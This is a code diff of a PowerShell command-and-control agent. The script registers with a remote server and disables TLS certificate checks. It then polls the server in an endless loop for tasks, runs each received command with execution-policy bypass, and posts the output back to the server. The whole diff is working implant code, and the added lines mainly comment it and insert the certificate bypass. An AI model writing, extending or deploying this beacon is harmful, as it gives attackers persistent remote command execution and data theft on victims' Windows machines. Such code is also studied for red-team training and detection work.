@@ -71,43 +71,56 @@
 #Invoke-Executable -sExeFile 'powershell' -cArgs @('/c', 'systeminfo')
 
 
-
+#Declaring Variables needed
 $hostname = [System.Net.Dns]::GetHostName()
 $username = whoami
 $ip   = "REPLACE_IP"
 $port = "REPLACE_PORT"
 $interface = "REPLACE_INTERFACE"
-# $key  = "REPLACE_KEY"
 $n = 3
 # $n    = replace_j
 
+#Agent registration link
 $regl  = ("https" + ':' + "//$ip" + ':' + "$port/reg/")
 $data  = @{
     eth = "$interface" 
     hname = "$hostname"
     username="$username"
     }
-    
+
+#configuring file settings to bypass ssl certificate check
+add-type @"
+    using System.Net;
+    using System.Security.Cryptography.X509Certificates;
+    public class TrustAllCertsPolicy : ICertificatePolicy {
+        public bool CheckValidationResult(
+            ServicePoint srvPoint, X509Certificate certificate,
+            WebRequest request, int certificateProblem) {
+            return true;
+        }
+    }
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+
+#Getting agent 6 characters name e.g. SDFCXS
 $name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
-#name= SDFCXS
 
-$taskl   = ("https" + ':' + "//$ip" + ':' + "$port/tasks/$name/")
+#Declaring tasks and results links 
+$taskl   = ("https" + ':' + "//$ip" + ':' + "$port/tasks/$name/")    # --> https://192.168.19.133:8000/tasks/SDFCXS
 $resultl = ("https" + ':' + "//$ip" + ':' + "$port/results/$name/")
-#https://1.1.1.1:1233/tasks/demo
 
 
+#Loop to check for tasks, recieve, execute & sends results in result Link
 for (;;){
-    
+
     $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
-    #whoami;systeminfo;ech
     
     if (-Not [string]::IsNullOrEmpty($task)){
         
         $result = Invoke-Executable -sExeFile 'powershell' -cArgs @('-ep bypass /c', $task)
         $data = @{result = "$result"}
-        # encryption aes
-        Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
-        #https://192.168.71.142:8000/results/GTLBHU/
+
+        Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST' # --> https://192.168.71.142:8000/results/GTLBHU/
 
     }
     Start-Sleep -Seconds $n
